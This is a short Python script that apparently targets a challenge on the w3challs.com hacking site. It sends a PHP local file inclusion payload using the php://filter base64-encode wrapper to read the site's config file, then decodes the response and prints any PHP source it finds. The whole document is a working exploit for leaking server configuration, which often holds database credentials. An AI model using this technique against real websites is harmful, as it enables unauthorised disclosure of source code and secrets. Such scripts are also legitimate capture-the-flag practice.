import requests, re, base64

def check():
    r = requests.get('http://webcompany.hax.w3challs.com/index.php?p=php://filter/convert.base64-encode/resource=config', timeout=30)
    print("CONFIG response:")
    b64 = re.findall(r'[A-Za-z0-9+/]{30,}={0,2}', r.text)
    if b64:
        for b in b64:
            try:
                dec = base64.b64decode(b).decode('utf-8')
                if '<?php' in dec:
                    print(dec)
            except:
                pass
check()
